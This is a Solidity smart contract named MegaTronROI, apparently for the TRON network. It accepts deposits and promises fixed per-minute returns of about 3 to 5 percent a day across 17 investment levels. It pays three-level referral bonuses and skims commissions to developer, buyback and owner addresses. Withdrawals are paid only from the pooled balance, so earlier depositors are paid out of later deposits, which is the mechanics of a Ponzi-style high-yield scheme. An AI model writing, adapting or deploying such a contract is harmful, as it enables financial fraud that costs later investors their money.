pragma solidity ^0.4.18;

contract MegaTronROI {

    using SafeMath for uint256;

    uint constant PERIOD = 1 minutes;

    uint public totalPlayers;
    uint public totalPayout;
    uint public minDepositSize = 10000000;
    uint public minuteInterestRateDivisor = 100000000;
    uint public devCommission = 5;
    uint public buybackComission = 3;
    uint public commissionDivisor = 100;
    uint public dividendComission = 5;
    uint public promoTokenBalance;
    uint public currentBonusRate;

    address owner;
    address devAddress;
    address buybackAddress;

    PromoEventInterface internal promoContract;
    TokenInterface internal tokenContract;

    bool freeTokenEventStatus=false;

    struct Player {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint currLevel;
        uint affInvestTotal;
        uint affRewards;
        address affFrom;
        uint256 aff1sum; //3 level
        uint256 aff2sum;
        uint256 aff3sum;
    }

    struct Level {
        uint256 interest;    // interest per minute %
        uint256 minInvestment;    // investment requirement
    }

    mapping(address => Player) public players;
    mapping (uint256 => Level) public level_;

    constructor(address _owner, address _devAddress, address _buybackAddress, TokenInterface _tokenContract, PromoEventInterface _promoContract) public {

      level_[1] =  Level(2083,0);          //daily 3.0
      level_[2] =  Level(2153,2500000000); //daily 3.1
      level_[3] =  Level(2223,5000000000); //daily 3.2
      level_[4] =  Level(2293,7500000000); //daily 3.3

      level_[5] =  Level(2433,10000000000);  //daily 3.5
      level_[6] =  Level(2503,30000000000); //daily 3.6
      level_[7] =  Level(2573,50000000000); //daily 3.7
      level_[8] =  Level(2643,70000000000); //daily 3.8

      level_[9] =  Level(2783,90000000000); //daily 4.0
      level_[10] = Level(2853,180000000000); //daily 4.1
      level_[11] = Level(2923,270000000000); //daily 4.2
      level_[12] = Level(2993,360000000000); //daily 4.3

      level_[13] = Level(3133,450000000000); //daily 4.5
      level_[14] = Level(3203,600000000000); //daily 4.6
      level_[15] = Level(3273,750000000000); //daily 4.7
      level_[16] = Level(3343,900000000000); //daily 4.8

      level_[17] = Level(3483,1200000000000); //daily 5.0

      owner = _owner;
      devAddress = _devAddress;
      buybackAddress = _buybackAddress;
      promoContract = PromoEventInterface(_promoContract);
      tokenContract = TokenInterface(_tokenContract);
    }

    function calculateCurrLevel(address _addr) private{

      uint totalInvestment = players[_addr].trxDeposit;
      uint totalAmount = totalInvestment.add(players[_addr].affInvestTotal);

      if(totalAmount < level_[2].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 1;
      }
      else if(totalAmount < level_[3].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 2;
      }
      else if(totalAmount < level_[4].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 3;
      }
      else if(totalAmount < level_[5].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 4;
      }
      else if(totalAmount < level_[6].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 5;
      }
      else if(totalAmount < level_[7].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 6;
      }
      else if(totalAmount < level_[8].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 7;
      }
      else if(totalAmount < level_[9].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 8;
      }
      else if(totalAmount < level_[10].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 9;
      }
      else if(totalAmount < level_[11].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 10;
      }
      else if(totalAmount < level_[12].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 11;
      }
      else if(totalAmount < level_[13].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 12;
      }
      else if(totalAmount < level_[14].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 13;
      }
      else if(totalAmount < level_[15].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 14;
      }
      else if(totalAmount < level_[16].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 15;
      }
      else if(totalAmount < level_[17].minInvestment){
        collect(_addr);
        players[_addr].currLevel = 16;
      }
      else{
        collect(_addr);
        players[_addr].currLevel = 17;
      }
    }

    function calculateReferral(address _addr, uint _value) private{
      address _affAddr1 = players[_addr].affFrom;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;

      players[_affAddr1].affInvestTotal = players[_affAddr1].affInvestTotal.add((_value.mul(4)).div(10));
      calculateCurrLevel(_affAddr1);
      players[_affAddr2].affInvestTotal = players[_affAddr2].affInvestTotal.add((_value.mul(2)).div(10));
      calculateCurrLevel(_affAddr2);
      players[_affAddr3].affInvestTotal = players[_affAddr3].affInvestTotal.add((_value.mul(1)).div(10));
      calculateCurrLevel(_affAddr3);
    }

    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;

      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
        require(msg.value >= minDepositSize);
        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }

        calculateReferral(msg.sender, msg.value);

        calculateCurrLevel(msg.sender);

        distributeRef(msg.value, player.affFrom);

        bool promoStatus = promoContract.promotionStatus_();
        if (freeTokenEventStatus && promoStatus) {
          promoContract.tokenBonus(msg.sender, msg.value);
        }

        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        devAddress.transfer(devEarn);
        uint buybackReserve = depositAmount.mul(buybackComission).div(commissionDivisor);
        buybackAddress.transfer(buybackReserve);
        uint dividendBalance = depositAmount.mul(dividendComission).div(commissionDivisor);
        tokenContract.distributeToAll.value(dividendBalance)(owner);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint depositAmount = player.interestProfit;
      require(depositAmount >= minDepositSize);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint minutePassed = ( now.sub(player.time) ).div(PERIOD);
        if (minutePassed > 0 && player.time > 0) {
            uint collectProfit = (player.trxDeposit.mul(minutePassed.mul(level_[player.currLevel].interest))).div(minuteInterestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add( minutePassed.mul(PERIOD) );
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(7)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(4)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            _affAddr1.transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            _affAddr2.transfer(_affRewards);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            _affAddr3.transfer(_affRewards);
       }

        if(_allaff > 0 ){
            owner.transfer(_allaff);
        }
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

      uint minutePassed = ( now.sub(player.time) ).div(PERIOD);
      if (minutePassed > 0) {
          uint collectProfit = (player.trxDeposit.mul(minutePassed.mul(level_[player.currLevel].interest))).div(minuteInterestRateDivisor);
      }
      return collectProfit.add(player.interestProfit);
    }

    function setFreeTokenEventStatus() public{
      require(msg.sender == owner);
      freeTokenEventStatus = true;
    }
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}

contract PromoEventInterface {
  function tokenBonus(address _investor, uint256 _amountOfTRX) public returns (bool);
  function promotionStatus_() public pure returns (bool);
  function contractBalance() public pure returns (uint256);
  function currentBonusRate() public view returns (uint8);
}

contract TokenInterface {
  function distributeToAll(address _referredBy) public payable returns (bool);
}